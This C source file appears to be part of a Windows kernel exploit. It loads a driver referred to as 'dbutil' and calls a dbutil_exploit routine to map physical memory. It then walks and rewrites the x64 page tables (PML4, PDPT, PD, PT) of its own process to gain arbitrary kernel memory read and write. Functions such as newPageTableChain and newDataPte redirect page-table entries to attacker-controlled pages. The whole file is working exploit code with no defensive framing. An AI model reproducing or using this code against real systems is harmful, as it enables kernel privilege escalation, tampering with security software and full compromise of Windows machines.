#include "pager.h"
#include "dbutil.h"
#include "kinfo.h"
#include "sysinfo.h"
#include "macro.h"
#include <stdio.h>

#define NUM_NONPAGED 16

typedef struct PagerInfo {
	ULONG64 physicalMapVa;
	// info of this process
	ULONG64 eprocessVa;
	ULONG64 directoryBase;
	ULONG64 nonpagedVa;
	DWORD currFreeNonPaged;
} PagerInfo;

static PagerInfo pagerInfo;
static BOOL verbose = TRUE;

void setPagerVerbose(BOOL b)
{
	verbose = b;
}

ULONG64* getPdePointer(ULONG64 directoryBase, ULONG64 virtualAddress)
{
	ULONG64* entries;
	DWORD idx;
	ULONG64 entry;

	//printf("    finding pPDE for va 0x%llx, dirBase: 0x%llx\n", targetVa, tableBase);
	entries = (ULONG64*)(pagerInfo.physicalMapVa + directoryBase);
	idx = PML4_IDX(virtualAddress);
	entry = entries[idx];
	//printf("      PML4 idx: 0x%x => 0x%llx\n", idx, entry);
	if (entry == 0 || (entry & PRESENT_FLAG) == 0) {
		printf("PML4E is invalid at 0x%x => 0x%llx\n", idx, entry);
		return 0;
	}

	entries = (ULONG64*)(pagerInfo.physicalMapVa + TABLE_ENTRY_PA(entry));
	idx = PDPT_IDX(virtualAddress);
	entry = entries[idx];
	//printf("      PDP idx: 0x%x => 0x%llx\n", idx, entry);
	if (entry == 0 || (entry & PRESENT_FLAG) == 0) {
		printf("PDPE is invalid at 0x%x => 0x%llx\n", idx, entry);
		return 0;
	}

	entries = (ULONG64*)(pagerInfo.physicalMapVa + TABLE_ENTRY_PA(entry));
	idx = PD_IDX(virtualAddress);
	return &entries[idx];
}

ULONG64* getPtePointer(ULONG64 virtualAddress)
{
	//printf("    finding pPTE for va 0x%llx\n", virtualAddress);
	ULONG64* pPde = getPdePointer(pagerInfo.directoryBase, virtualAddress);
	ULONG64 entry = *pPde;
	if (verbose)
		printf("      PDE = 0x%llx\n", entry);
	if (entry == 0 || (entry & PRESENT_FLAG) == 0) {
		// expect, no 2MB page without allocation
		printf("      PDE is invalid, 0x%llx\n", entry);
		return NULL;
	}
	if (entry & PAGESIZE_FLAG) {
		printf("  Unexpected 2MB page size, 0x%llx\n", entry);
		return NULL;
	}

	DWORD idx = PT_IDX(virtualAddress);
	ULONG64* entries = (ULONG64*)(pagerInfo.physicalMapVa + TABLE_ENTRY_PA(entry));

	return &entries[idx];
}

ULONG64 walkPagePhysical(ULONG64 directoryBase, ULONG64 virtualAddress)
{
	if (verbose)
		printf("    walking page for va 0x%llx, dirBase: 0x%llx\n", virtualAddress, directoryBase);

	// Note: entry is MMPTE_HARDWARE struct
	// https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/mm/mi/mmpte/hardware.htm
	ULONG64 entry;

	ULONG64* pPde = getPdePointer(directoryBase, virtualAddress);
	entry = *pPde;
	if (verbose)
		printf("      PDE = 0x%llx\n", entry);
	if (entry == 0 || (entry & PRESENT_FLAG) == 0) {
		// expect, no 2MB page without allocation
		printf("      PDE is invalid, 0x%llx\n", entry);
		return NULL;
	}
	if (entry & PAGESIZE_FLAG) {
		//printf("  2MB page size, idx: 0x%x => 0x%llx\n", idx, entry);
		return TABLE_ENTRY_PA(entry) + PAGE2M_OFFSET(virtualAddress);
	}

	ULONG64* entries = (ULONG64*)(pagerInfo.physicalMapVa + TABLE_ENTRY_PA(entry));
	DWORD idx = PT_IDX(virtualAddress);
	entry = entries[idx];
	if (verbose)
		printf("      PT idx: 0x%x => 0x%llx\n", idx, entry);
	if (entry == 0) {
		// expect, no 2MB page without allocation
		printf("      PTE is invalid at 0x%x => 0x%llx\n", idx, entry);
		return 0;
	}
	if ((entry & PRESENT_FLAG) == 0) {
		if ((entry & PAGESIZE_FLAG) != 0) {
			// map to zero page
			//return (ULONG64)memInfo->fakeZeroPage + PAGE_OFFSET(virtualAddress);
			return 1;
		}
		else {
			printf("      PTE is invalid at 0x%x => 0x%llx\n", idx, entry);
			return 0;
		}
	}

	return TABLE_ENTRY_PA(entry) + PAGE_OFFSET(virtualAddress);
}

ULONG64 walkPage(ULONG64 virtualAddress)
{
	return pagerInfo.physicalMapVa + walkPagePhysical(pagerInfo.directoryBase, virtualAddress);
}

BYTE* getMappedMemory(ULONG64 pte)
{
	return (BYTE*)pagerInfo.physicalMapVa + TABLE_ENTRY_PA(pte);
}

BOOL pager_init()
{
	HANDLE hDevice = dbutil_loadDevice();
	if (hDevice == NULL) {
		printf("Fail to load driver: %d\n", GetLastError());
		return FALSE;
	}

	pagerInfo.eprocessVa = getMyEProcessVirtualAddress();
	printf("[+] EPROCESS VA: 0x%llx\n", pagerInfo.eprocessVa);
	if (!dbutil_exploit(hDevice, pagerInfo.eprocessVa, &pagerInfo.directoryBase, &pagerInfo.physicalMapVa)) {
		CloseHandle(hDevice);
		return FALSE;
	}

	PVOID buffer = VirtualAlloc(NULL, (NUM_NONPAGED + 1) * PAGE_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	pagerInfo.nonpagedVa = ((ULONG64)buffer + 4095) & ~((ULONG64)PAGE_MASK);

	pagerInfo.currFreeNonPaged = 0;
	printf("[+] nonpagedVa: 0x%llx\n", pagerInfo.nonpagedVa);

	return TRUE;
}

ULONG64 pager_readU64(ULONG64 virtualAddress)
{
	return *((ULONG64*)walkPage(virtualAddress));
}

ULONG64 getPteValue(ULONG64 virtualAddress)
{
	// cannot use getPtePointer because we want to return PTE even page size is 2MB
	ULONG64 entry = *getPdePointer(pagerInfo.directoryBase, virtualAddress);
	DWORD pt_idx = PT_IDX(virtualAddress);
	if (entry == 0 || (entry & PRESENT_FLAG) == 0) {
		// expect, no 2MB page without allocation
		printf("      PDE is invalid, 0x%llx\n", entry);
		return 0;
	}
	if (entry & PAGESIZE_FLAG) {
		return (entry & ~((ULONG64)PAGESIZE_FLAG)) + PAGE_SIZE * pt_idx;
	}

	ULONG64* entries = (ULONG64*)(pagerInfo.physicalMapVa + TABLE_ENTRY_PA(entry));
	return entries[pt_idx];
}

BOOL getFreeNonpaged(NonPagedInfo* pageInfo)
{
	if (pagerInfo.currFreeNonPaged == NUM_NONPAGED) {
		printf("   [x] Unexpected no free nonpaged left\n");
		return FALSE;
	}

	DWORD idx = pagerInfo.currFreeNonPaged++;
	BYTE* page = (BYTE*)(pagerInfo.nonpagedVa + idx * PAGE_SIZE);
	// write non zero to requested page to be sure that this page is backed by physical memory
	*page = 1;
	if (!VirtualLock(page, PAGE_SIZE)) {
		printf("   [x] Cannot lock memory page\n");
		return FALSE;
	}

	pageInfo->physicalAddress = walkPagePhysical(pagerInfo.directoryBase, (ULONG64)page);
	pageInfo->buffer = page;
	return TRUE;
}

void restorePageEntry(SavePageEntry* info)
{
	if (info->pEntry) {
		*(info->pEntry) = info->value;
	}
}

BYTE* newPageTableChain(ULONG64 targetVa, PageChainInfo* pageChainInfo, SavePageEntry* oldPml4e)
{
	if (!getFreeNonpaged(&pageChainInfo->pdp)) {
		return NULL;
	}
	if (!getFreeNonpaged(&pageChainInfo->pd)) {
		return NULL;
	}
	if (!getFreeNonpaged(&pageChainInfo->pt)) {
		return NULL;
	}
	if (!getFreeNonpaged(&pageChainInfo->data)) {
		return NULL;
	}

	ULONG64 entry;
	DWORD pml4_idx = PML4_IDX(targetVa);
	DWORD pdp_idx = PDPT_IDX(targetVa);
	DWORD pd_idx = PD_IDX(targetVa);
	DWORD pt_idx = PT_IDX(targetVa);

	ULONG64* pml4_entries = (ULONG64*)(pagerInfo.physicalMapVa + pagerInfo.directoryBase);
	entry = pml4_entries[pml4_idx];
	//printf("      PML4 idx: 0x%x => 0x%llx\n", pml4_idx, entry);
	if (entry == 0 || (entry & PRESENT_FLAG) == 0) {
		printf("PML4E is invalid at 0x%x => 0x%llx\n", pml4_idx, entry);
		return NULL;
	}

	ULONG64* pdp_entries = (ULONG64*)(pagerInfo.physicalMapVa + TABLE_ENTRY_PA(entry));
	entry = pdp_entries[pdp_idx];
	//printf("      PDP idx: 0x%x => 0x%llx\n", pdp_idx, entry);
	if (entry == 0 || (entry & PRESENT_FLAG) == 0) {
		printf("PDPE is invalid at 0x%x => 0x%llx\n", pdp_idx, entry);
		return NULL;
	}
	memcpy(pageChainInfo->pdp.buffer, pdp_entries, PAGE_SIZE);
	pdp_entries = (ULONG64*)pageChainInfo->pdp.buffer;

	ULONG64* pd_entries = (ULONG64*)(pagerInfo.physicalMapVa + TABLE_ENTRY_PA(entry));
	entry = pd_entries[pd_idx];
	if (verbose)
		printf("      PD idx: 0x%x => 0x%llx\n", pd_idx, entry);
	if (entry == 0 || (entry & PRESENT_FLAG) == 0) {
		// expect, no 2MB page without allocation
		printf("      PDE is invalid at 0x%x => 0x%llx\n", pd_idx, entry);
		return NULL;
	}
	memcpy(pageChainInfo->pd.buffer, pd_entries, PAGE_SIZE);
	pd_entries = (ULONG64*)pageChainInfo->pd.buffer;

	ULONG64* pt_entries;
	if (entry & PAGESIZE_FLAG) {
		// PTEs from splitted PDE
		ULONG64 baseEntry = entry & ~((ULONG64)(PAGESIZE_FLAG | PAGEGLOBAL_FLAG));
		pt_entries = (ULONG64*)pageChainInfo->pt.buffer;
		//printf("  baseEntry: 0x%llx\n", baseEntry);
		for (int i = 0; i < 512; i++) {
			pt_entries[i] = baseEntry + (i * PAGE_SIZE);
		}
	}
	else {
		pt_entries = (ULONG64*)(pagerInfo.physicalMapVa + TABLE_ENTRY_PA(entry));
		entry = pt_entries[pt_idx];
		if (verbose)
			printf("      PT idx: 0x%x => 0x%llx\n", pt_idx, entry);
		if (entry == 0 || (entry & PRESENT_FLAG) == 0) {
			printf("      PTE is invalid at 0x%x => 0x%llx\n", pt_idx, entry);
			return NULL;
		}
		memcpy(pageChainInfo->pt.buffer, pt_entries, PAGE_SIZE);
		pt_entries = (ULONG64*)pageChainInfo->pt.buffer;
	}

	// page data
	memcpy(pageChainInfo->data.buffer, (BYTE*)pagerInfo.physicalMapVa + TABLE_ENTRY_PA(pt_entries[pt_idx]), PAGE_SIZE);

	oldPml4e->pEntry = &pml4_entries[pml4_idx];
	oldPml4e->value = pml4_entries[pml4_idx];

	pt_entries[pt_idx] = pageChainInfo->data.physicalAddress | 0x8a00000000000027; // access, rw, present
	pd_entries[pd_idx] = pageChainInfo->pt.physicalAddress | 0x0000000000000067; // dirty, access, rw, present
	pdp_entries[pdp_idx] = pageChainInfo->pd.physicalAddress | 0x0000000000000067;
	pml4_entries[pml4_idx] = pageChainInfo->pdp.physicalAddress | 0x0000000000000067;

	return pageChainInfo->data.buffer + PAGE_OFFSET(targetVa);
}

BOOL newDataPte(ULONG64 targetVa, NonPagedInfo* pageInfo, SavePageEntry *oldPte)
{
	ULONG64* pPte = getPtePointer(targetVa);
	if (pPte == NULL) {
		printf("!!! Cannot get PTE poninter for 0x%llx\n", targetVa);
		return FALSE;
	}

	if (!getFreeNonpaged(pageInfo)) {
		return NULL;
	}

	oldPte->pEntry = pPte;
	oldPte->value = *pPte;

	BYTE* origData = (BYTE*)pagerInfo.physicalMapVa + TABLE_ENTRY_PA(*pPte);
	memcpy(pageInfo->buffer, origData, PAGE_SIZE);
	*pPte = pageInfo->physicalAddress | 0x8a00000000000021; // access, present

	return TRUE;
}
